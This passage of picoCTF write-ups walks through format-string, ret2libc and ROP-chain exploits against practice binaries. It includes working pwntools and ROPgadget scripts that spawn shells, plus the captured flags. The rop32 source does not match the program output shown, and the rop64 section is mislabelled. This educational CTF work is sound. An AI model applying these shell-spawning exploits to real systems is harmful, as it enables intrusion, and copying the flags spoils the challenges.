#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#define FLAG_BUFFER 128
#define LINE_BUFFER_SIZE 2000

void printMessage3(char *in) {
  puts(&quot;will be printed:\n&quot;);
  printf(in);
}
void printMessage2(char *in) {
  puts(&quot;your input &quot;);
  printMessage3(in);
}
void printMessage1(char *in) {
  puts(&quot;Now &quot;);
  printMessage2(in);
}

int main (int argc, char **argv) {
    puts(&quot;input whatever string you want; then it will be printed back:\n&quot;);
    int read;
    unsigned int len;
    char *input = NULL;
    getline(&amp;input, &amp;len, stdin);
    //There is no win function, but the flag is wandering in the memory!
    char * buf = malloc(sizeof(char)*FLAG_BUFFER);
    FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
    fgets(buf,FLAG_BUFFER,f);
    printMessage1(input);
    fflush(stdout);
}
</code></pre><p>After reading the paper recommended from the hints, it looks like we'll be expoiting the <code>printf()</code> vulnerability.
Let's determine if this program is vulnerable to the <code>printf()</code> vulnerability.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/stringzz_2$ ./vuln
input whatever string you want; then it will be printed back:

%x %x %x %x %x
Now 
your input 
will be printed:

a f7d8a36b 565da6f9 f7ef8000 565dbfb4
</code></pre><p>It is vulnerable. Let's try printing 100 items off the stack and grep for the flag.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/stringzz_2$  echo $(python -c &quot;print('%x '*100)&quot;) | ./vuln
input whatever string you want; then it will be printed back:

Now 
your input 
will be printed:

a f7e1836b 565bf6f9 f7f86000 565c0fb4 ffe72f38 565bf755 56889600 565bf995 f7e1836b 565bf731 f7f86000 565c0fb4 ffe72f58 565bf78e 56889600 565bf993 f7e1681b 565bf76a f7f86000 565c0fb4 ffe72fa8 565bf84d 56889600 80 568897d0 565bf7ae f7f86000 f7f86000 0 ffe73054 f7f863fc 565c0fb4 ffe7305c 12e 56889600 56889740 568897d0 b6b68c00 ffe72fc0 0 0 f7dc9e81 f7f86000 f7f86000 0 f7dc9e81 1 ffe73054 ffe7305c ffe72fe4 1 ffe73054 f7f86000 f7fad75a ffe73050 0 f7f86000 0 0 53fd859e 249e838e 0 0 0 40 f7fc5024 0 0 f7fad869 565c0fb4 1 565bf5b0 0 565bf5e1 565bf797 1 ffe73054 565bf890 565bf8f0 f7fad9b0 ffe7304c f7fc5940 1 ffe747ca 0 ffe747d1 ffe74dbd ffe74df0 ffe74e12 ffe74e1f ffe74e33 ffe74e3f ffe74e79 ffe74e8b ffe74ead ffe74eee ffe74f01 ffe74f17 ffe74f2b 
</code></pre><p>Okay, whatever it is, we'll need to print it as a string. We can't simply use <code>%s</code> though. See below:<pre><code class=language-bash>samson@pico-2019-shell1:/problems/stringzz_2$ echo $(python -c &quot;print('%s')&quot;) | ./vuln
input whatever string you want; then it will be printed back:

Now 
your input 
will be printed:

Segmentation fault (core dumped)
</code></pre><p>This works because <code>%x</code> prints values off the stack<p>The exploit we want to take advantage of is the <code>Format String Direct Access</code> explained in this <a href=https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf>paper</a>.<p><code>%4$x</code> - prints the 4th parameter on the stack in hex, so <code>%4$s</code> should print it in ASCII.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/stringzz_2$ ./vuln
input whatever string you want; then it will be printed back:

%4$x   
Now 
your input 
will be printed:

f7fa8000
samson@pico-2019-shell1:/problems/stringzz_2$ ./vuln
input whatever string you want; then it will be printed back:

%4$s
Now 
your input 
will be printed:

lM
</code></pre><pre><code class=language-bash>samson@pico-2019-shell1:/problems/stringzz_2$ python -c &quot;print('%5$s')&quot; | ./vuln

input whatever string you want; then it will be printed back:

Now 
your input 
will be printed:

%5
</code></pre><p>Doesn't seem to work, so let's brute force it:<pre><code class=language-python>#!/usr/bin/env python
from __future__ import print_function
from pwn import *

index = 1
while True:
    print(&quot;Attempting index: {}&quot;.format(index))
    p = process('./vuln', cwd='/problems/stringzz_2')
    p.recvuntil('input whatever string you want; then it will be printed back:')
    p.sendline(&quot;%{}$s&quot;.format(index))
    res = p.recvall()
    if &quot;picoCTF&quot; in res:
        print(&quot;Found flag: {}&quot;.format(res))
        break
    index=index+1
</code></pre><p>Amazingly, it returns with an answer.<h2><a class=header href=#flag-7 id=flag-7>Flag</a></h2><p><code>picoCTF{str1nG_CH3353_166b95b4}</code><h1><a class=header href=#picoctf18-learn-libc id=picoctf18-learn-libc>PicoCTF18 learn-libc</a></h1><h2><a class=header href=#challenge-8 id=challenge-8>Challenge</a></h2><p>This <a href=https://2018shell.picoctf.com/static/3f9baed3a53fe9962f7bd7b14b58d07e/vuln>program</a> gives you the address of some system calls. Can you get a shell? You can find the program in /problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833 on the shell server. <a href=https://2018shell.picoctf.com/static/3f9baed3a53fe9962f7bd7b14b58d07e/vuln.c>Source</a>.<h2><a class=header href=#hints-8 id=hints-8>Hints</a></h2><p>try returning to systems calls to leak information<p>don't forget you can always return back to main()<h2><a class=header href=#solution-8 id=solution-8>Solution</a></h2><p>vuln.c:<pre><code class=language-c>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#define BUFSIZE 148
#define FLAGSIZE 128

char useful_string[16] = &quot;/bin/sh&quot;; /* Maybe this can be used to spawn a shell? */

void vuln(){
  char buf[BUFSIZE];
  puts(&quot;Enter a string:&quot;);
  gets(buf);
  puts(buf);
  puts(&quot;Thanks! Exiting now...&quot;);
}

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts(&quot;Here are some useful addresses:\n&quot;);
  printf(&quot;puts: %p\n&quot;, puts);
  printf(&quot;fflush %p\n&quot;, fflush);
  printf(&quot;read: %p\n&quot;, read);
  printf(&quot;write: %p\n&quot;, write);
  printf(&quot;useful_string: %p\n&quot;, useful_string);
  printf(&quot;\n&quot;);
  vuln();
  return 0;
}
</code></pre><p>Let's view the directory:<pre><code class=language-bash>samson@pico-2018-shell:/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833$ ls -al
total 72
drwxr-xr-x   2 root       root                4096 Mar 25  2019 .
drwxr-x--x 556 root       root               53248 Mar 25  2019 ..
-r--r-----   1 hacksports got-2-learn-libc_1    37 Mar 25  2019 flag.txt
-rwxr-sr-x   1 hacksports got-2-learn-libc_1  7856 Mar 25  2019 vuln
-rw-rw-r--   1 hacksports hacksports           843 Mar 25  2019 vuln.c
</code></pre><p>This question seems to be talking about using a <code>ret-2-libc</code> attack, but let's see if there's an easier way or if they intended it to be that way.<p>Let's use this script to determine what's available to us:<pre><code class=language-python>#!/usr/bin/env python

from pwn import *

if len(sys.argv) &lt; 2:
    elf = ELF('./vuln')
    sh = elf.process()
else:
    s = ssh(host='2018shell4.picoctf.com', user='samson', password=getpass())
    sh = s.process('vuln', cwd='/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833')
</code></pre><pre><code class=language-bash>samson@pico-2018-shell:/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833$ python ~/lib.py
[*] '/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833/vuln': pid 3914031
[*] Stopped process '/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833/vuln' (pid 3914031)
</code></pre><p>Seems like the <code>NX</code> bit is set which means the stack is non-executable. We can't just insert shellcode and point <code>eip</code> to the start of our buffer.<p>So let's the binary and see how it works.<pre><code class=language-bash>samson@pico-2018-shell:/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833$ ./vuln
Here are some useful addresses:

puts: 0xf75bd140
fflush 0xf75bb330
read: 0xf7632350
write: 0xf76323c0
useful_string: 0x56648030

Enter a string:
AAAAAAAAAAAAA
AAAAAAAAAAAAA
Thanks! Exiting now...
</code></pre><p>Let's try some inputs and verify it's susceptible to overflow: ``<p>I noticed that the addresses seem to change over time, take a look between these three runs<table><thead><tr><th><th>Run 0<th>Run 1<th>Run 2<tbody><tr><td>puts<td>0xf75bd140<td>0xf75bd140<td>0xf75bd140<tr><td>fflush<td>0xf75bb330<td>0xf75bb330<td>0xf75bb330<tr><td>read<td>0xf7632350<td>0xf765b350<td>0xf765b350<tr><td>write<td>0xf765b3c0<td>0xf765b3c0<td>0xf765b3c0<tr><td>useful_string<td><em>0x56626030</em><td><em>0x56648030</em><td><em>0x565bf030</em></table><p>Note how the <code>useful_string</code> address changes all the time.<p>Since we have the address for other libc commands and they remain constant, we can also determine the address of the command <code>system()</code> and be sure it'll always stay at the address we find it.<pre><code class=language-bash>samson@pico-2018-shell:/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833$ gdb vuln
&lt; REDACTED &gt;
(gdb) b main
Breakpoint 1 at 0x812
(gdb) r
Starting program: /problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833/vuln

Breakpoint 1, 0x5663e812 in main ()
(gdb) x puts
0xf759b140 &lt;puts&gt;:      0x57e58955
(gdb) x system
0xf7576940 &lt;system&gt;:    0x8b0cec83
</code></pre><p>We found <code>system()</code> at <code>0xf7576940</code>. So let's calculate the offset to <code>puts()</code> so we can be sure we're hitting system every time.<p>Great now from here, we just need to cause an overflow and set up the stack such that the processor will run whatever command we want with the proper arguments.<p>We need to make our stack look like this:<table><thead><tr><th><th>Stack<tbody><tr><td>Arguments to <code>system()</code><td><code>/bin/sh</code><tr><td>Caller function to return to<td><code>AAAA</code><tr><td>Function Call<td><code>system()</code><tr><td><td></table><p>We can insert anything we want for the return address because once our exploit runs, we should have popped open a shell and the program will never need to return validly. Although, I believe the hint is trying to make it easy for us to debug by telling us to return to <code>main()</code>.<p>So let's figure out the buffer overflow. I'll spare the details for how many A's are needed.
But we need to be sure ESP points ot the top of the stack shown above.<pre><code class=language-python>#!/usr/bin/env python

from pwn import *

if len(sys.argv) &lt; 2:
    elf = ELF('/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833/vuln')
    sh = elf.process()
else:
    s = ssh(host='2018shell4.picoctf.com', user='samson', password=&quot;REDACTED&quot;)
    sh = s.process('vuln', cwd='/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833')

libc = ELF('/lib32/libc.so.6')
offset_system = libc.symbols['system']
offset_puts = libc.symbols['puts']
offset = offset_system - offset_puts

sh.recvuntil('puts: ')
addr_puts = int(sh.recv(10), 16)
sh.recvuntil('useful_string: ')
addr_shell = int(sh.recv(10), 16)
addr_system  = addr_puts + offset
#-----------------------------------------------
# A's + &amp;system() + return address +&amp;/bin/sh
#-----------------------------------------------
sleep(1)
payload = 'A'*160 + p32(addr_system)+ 'A'*4 + p32(addr_shell)
sh.sendline(payload)
sh.sendline('cat /problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833/flag.txt')
sh.interactive()
</code></pre><pre><code class=language-bash>samson@pico-2018-shell:/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833$ python ~/libw.py
[*] '/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833/vuln': pid 3917593
[*] '/lib32/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode


Enter a string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@9cAAAA0WV
Thanks! Exiting now...
picoCTF{syc4al1s_4rE_uS3fUl_a78c4d87}$
</code></pre><h2><a class=header href=#flag-8 id=flag-8>Flag</a></h2><p><code>picoCTF{syc4al1s_4rE_uS3fUl_a78c4d87}</code><h2><a class=header href=#notes id=notes>Notes</a></h2><p>Untested<p>You can apparently find cycles like this:<pre><code>#find buffer amount
'''
pwn cyclic 172 | strace ./vuln
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x62616170} ---
+++ killed by SIGSEGV +++
Segmentation fault
pwn cyclic -l 0x62616170
160
'''
</code></pre><h1><a class=header href=#picoctf19-rop32 id=picoctf19-rop32>PicoCTF19 rop32</a></h1><h2><a class=header href=#challenge-9 id=challenge-9>Challenge</a></h2><p>Can you exploit the following <a href=https://2019shell1.picoctf.com/static/e0fe06487514cf7b6b901d4013225d07/vuln>program</a> to get a flag? You can find the program in /problems/rop32 on the shell server. <a href=https://2019shell1.picoctf.com/static/e0fe06487514cf7b6b901d4013225d07/vuln.c>Source</a>.<h2><a class=header href=#hints-9 id=hints-9>Hints</a></h2><p>This is a classic ROP to get a shell<h2><a class=header href=#solution-9 id=solution-9>Solution</a></h2><pre><code class=language-c>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

#define FLAG_BUFFER 128

void win() {
  char buf[FLAG_BUFFER];
  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
  fgets(buf,FLAG_BUFFER,f);
  puts(buf);
  fflush(stdout);
}

void replaceIntegerInArrayAtIndex(unsigned int *array, int index, int value) {
   array[index] = value;
}

int main(int argc, char *argv[])
{
   int index;
   int value;
   int array[666];
   puts(&quot;Input the integer value you want to put in the array\n&quot;);
   scanf(&quot;%d&quot;,&amp;value);
   fgetc(stdin);
   puts(&quot;Input the index in which you want to put the value\n&quot;);
   scanf(&quot;%d&quot;,&amp;index);
   replaceIntegerInArrayAtIndex(array,index,value);
   exit(0);
}
</code></pre><p>Let's view the directory:<pre><code class=language-bash>samson@pico-2019-shell1:/problems/rop32$ ls -al
total 732
drwxr-xr-x   2 root       root         4096 Sep 28  2019 .
drwxr-x--x 684 root       root        69632 Oct 10  2019 ..
-r--r-----   1 hacksports rop32_0        31 Sep 28  2019 flag.txt
-rwxr-sr-x   1 hacksports rop32_0    661832 Sep 28  2019 vuln
-rw-rw-r--   1 hacksports hacksports    466 Sep 28  2019 vuln.c
</code></pre><p>Same structure as before, let's see if using ROP is the only way to finish this challenge:<pre><code class=language-bash>samson@pico-2019-shell1:/problems/rop32$ checksec vuln
[*] '/problems/rop32/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre><p>Seems like NX and ALSR are both enabled, so ROP is the only technique we can use to bypass this program.<p>Let's try some random inputs into the program:<pre><code class=language-bash>samson@pico-2019-shell1:/problems/rop32$ ./vuln
Can you ROP your way out of this one?
123
samson@pico-2019-shell1:/problems/rop32$ ./vuln
Can you ROP your way out of this one?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
</code></pre><p>Just as suspected from the source code of the problem, the <code>fgetc()</code> function call causes an overflow.<p>Given the hint of the program, I assume we also need to pop a shell.<p>Let's use this tool called <a href=https://github.com/JonathanSalwan/ROPgadget>ROPGadget</a><p>This tool will help us find all gadgets and give it to us in a <code>pwntools</code> friendly format.<p>So lets run:<pre><code class=language-bash>$ ROPgadget --binary ./vuln  --ropchain --badbytes 0a
</code></pre><p>We are using the <code>--badbytes 0a</code> argument in order to receive an exploint that doesn't contain a new line character as <code>fgetc()</code> would discard anything after it causing the ROP Chain to fail.<pre><code>&lt; REDACTED &gt;

Unique gadgets found: 29905

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

        [+] Gadget found: 0x8056e65 mov dword ptr [edx], eax ; ret
        [+] Gadget found: 0x806ee6b pop edx ; ret
        [+] Gadget found: 0x8056334 pop eax ; pop edx ; pop ebx ; ret
        [+] Gadget found: 0x8056420 xor eax, eax ; ret

- Step 2 -- Init syscall number gadgets

        [+] Gadget found: 0x8056420 xor eax, eax ; ret
        [+] Gadget found: 0x807c2fa inc eax ; ret

- Step 3 -- Init syscall arguments gadgets

        [+] Gadget found: 0x80481c9 pop ebx ; ret
        [+] Gadget found: 0x806ee92 pop ecx ; pop ebx ; ret
        [+] Gadget found: 0x806ee6b pop edx ; ret

- Step 4 -- Syscall gadget

        [+] Gadget found: 0x8049563 int 0x80

- Step 5 -- Build the ROP chain

        #!/usr/bin/env python2
        # execve generated by ROPgadget
&lt; REDACTED &gt;
        p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
        p += pack('&lt;I', 0x08049563) # int 0x80
</code></pre><p>Here is some shortened output from <code>ROPGadget</code><p>So let's make that into a file <code>/tmp/rop.py</code>:<p>We need to cause the buffer overflow so let's add 16 or more <code>A</code>s.<pre><code class=language-python>#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = 'A'*20  # buffer is size 16, let's increment by 4 until it works.

p += pack('&lt;I', 0x0806ee6b) # pop edx ; ret
p += pack('&lt;I', 0x080da060) # @ .data
p += pack('&lt;I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
p += '/bin'
p += pack('&lt;I', 0x080da060) # padding without overwrite edx
p += pack('&lt;I', 0x41414141) # padding
p += pack('&lt;I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('&lt;I', 0x0806ee6b) # pop edx ; ret
p += pack('&lt;I', 0x080da064) # @ .data + 4
p += pack('&lt;I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
p += '//sh'
p += pack('&lt;I', 0x080da064) # padding without overwrite edx
p += pack('&lt;I', 0x41414141) # padding
p += pack('&lt;I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('&lt;I', 0x0806ee6b) # pop edx ; ret
p += pack('&lt;I', 0x080da068) # @ .data + 8
p += pack('&lt;I', 0x08056420) # xor eax, eax ; ret
p += pack('&lt;I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('&lt;I', 0x080481c9) # pop ebx ; ret
p += pack('&lt;I', 0x080da060) # @ .data
p += pack('&lt;I', 0x0806ee92) # pop ecx ; pop ebx ; ret
p += pack('&lt;I', 0x080da068) # @ .data + 8
p += pack('&lt;I', 0x080da060) # padding without overwrite ebx
p += pack('&lt;I', 0x0806ee6b) # pop edx ; ret
p += pack('&lt;I', 0x080da068) # @ .data + 8
p += pack('&lt;I', 0x08056420) # xor eax, eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x0807c2fa) # inc eax ; ret
p += pack('&lt;I', 0x08049563) # int 0x80
print p
</code></pre><p>Let's run it and feed it into the program<pre><code class=language-bash>samson@pico-2019-shell1:/problems/rop32$ (python /tmp/rop.py;cat) | ./vuln 
Can you ROP your way out of this one?
ls
flag.txt  vuln  vuln.c
cat flag.txt
picoCTF{rOp_t0_b1n_sH_01a585a7}
</code></pre><h2><a class=header href=#flag-9 id=flag-9>Flag</a></h2><p><code>picoCTF{rOp_t0_b1n_sH_01a585a7}</code><h1><a class=header href=#picoctf19-rop32-1 id=picoctf19-rop32-1>PicoCTF19 rop32</a></h1><h2><a class=header href=#challenge-10 id=challenge-10>Challenge</a></h2><p>Time for the classic ROP in 64-bit. Can you exploit this program to get a flag? You can find the <a href=https://2019shell1.picoctf.com/static/7934fa08773c081500e9d9a0db43e56e/vuln>program</a> in /problems/rop64_1_3a135066aff0c433faf93765baaa584d on the shell server. <a href=https://2019shell1.picoctf.com/static/7934fa08773c081500e9d9a0db43e56e/vuln.c>Source</a>.<h2><a class=header href=#hints-10 id=hints-10>Hints</a></h2><p>This is a classic 64-bit OP to get a shell<h2><a class=header href=#solution-10 id=solution-10>Solution</a></h2><pre><code class=language-c>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf(&quot;Can you ROP your way out of this?\n&quot;);
  return gets(buf);
}

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
}
</code></pre><pre><code class=language-bash>samson@pico-2019-shell1:/problems/rop64_1_3a135066aff0c433faf93765baaa584d$ ls -al
total 912
drwxr-xr-x   2 root       root         4096 Sep 28  2019 .
drwxr-x--x 684 root       root        69632 Oct 10  2019 ..
-r--r-----   1 hacksports rop64_1        48 Sep 28  2019 flag.txt
-rwxr-sr-x   1 hacksports rop64_1    844904 Sep 28  2019 vuln
-rw-rw-r--   1 hacksports hacksports    462 Sep 28  2019 vuln.c
</code></pre><p>Similarly to <code>rop32</code>, this program is vulnerable to a buffer overflow and I assume NX & ASLR is enabled as well:<pre><code class=language-bash>samson@pico-2019-shell1:/problems/rop64_1_3a135066aff0c433faf93765baaa584d$ ./vuln
Can you ROP your way out of this?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
</code></pre><p>Let's run <a href=https://github.com/JonathanSalwan/ROPgadget>ROPGadget</a> again<pre><code class=language-bash>samson@pico-2019-shell1:/problems/rop64_1_3a135066aff0c433faf93765baaa584d$ ROPgadget --binary ./vuln  --ropchain --badbytes 0a
</code></pre><p>Here's the rop script:<pre><code class=language-python>#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = 'A' *24 # &lt;- we added 4 for 32, add 8 for 64 rough guess

p += pack('&lt;Q', 0x00000000004100d3) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006b90e0) # @ .data
p += pack('&lt;Q', 0x00000000004156f4) # pop rax ; ret
p += '/bin//sh'
p += pack('&lt;Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
p += pack('&lt;Q', 0x00000000004100d3) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006b90e8) # @ .data + 8
p += pack('&lt;Q', 0x0000000000444c50) # xor rax, rax ; ret
p += pack('&lt;Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
p += pack('&lt;Q', 0x0000000000400686) # pop rdi ; ret
p += pack('&lt;Q', 0x00000000006b90e0) # @ .data
p += pack('&lt;Q', 0x00000000004100d3) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006b90e8) # @ .data + 8
p += pack('&lt;Q', 0x00000000004499b5) # pop rdx ; ret
p += pack('&lt;Q', 0x00000000006b90e8) # @ .data + 8
p += pack('&lt;Q', 0x0000000000444c50) # xor rax, rax ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000040123c) # syscall
print p # IMPORTANT: This is not generated by ROPGadget, add this yourself
</code></pre><p>Exploit it:<pre><code class=language-bash>samson@pico-2019-shell1:/problems/rop64_1_3a135066aff0c433faf93765baaa584d$ (python ~/rop.py;cat) | ./vuln
Can you ROP your way out of this?
ls
flag.txt  vuln  vuln.c
cat flag.txt
picoCTF{rOp_t0_b1n_sH_w1tH_n3w_g4dg3t5_7b18513b}
</code></pre><h2><a class=header href=#flag-10 id=flag-10>Flag</a></h2><p><code>picoCTF{rOp_t0_b1n_sH_w1tH_n3w_g4dg3t5_7b18513b}</code><h1><a class=header href=#picoctf19-leap-frog id=picoctf19-leap-frog>PicoCTF19 leap-frog</a></h1><h2><a class=header href=#challenge-11 id=challenge-11>Challenge</a></h2><p>Can you jump your way to win in the following <a href=https://2019shell1.picoctf.com/static/a7394c555b8cd0a7eac288c45367c49d/rop>program</a> and get the flag? You can find the program in /problems/leap-frog on the shell server? <a href=https://2019shell1.picoctf.com/static/a7394c555b8cd0a7eac288c45367c49d/rop.c>Source</a>.<h2><a class=header href=#hints-11 id=hints-11>Hints</a></h2><p>Try and call the functions in the correct order!<p>Remember, you can always call <code>main()</code> again!<h2><a class=header href=#solution-11 id=solution-11>Solution</a></h2><pre><code class=language-c>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdbool.h&gt;

#define FLAG_SIZE 64

bool win1 = false;
bool win2 = false;
bool win3 = false;

void leapA() {
  win1 = true;
}

void leap2(unsigned int arg_check) {
  if (win3 &amp;&amp; arg_check == 0xDEADBEEF) {
    win2 = true;
  }  else if (win3) {
    printf(&quot;Wrong Argument. Try Again.\n&quot;);
  } else {
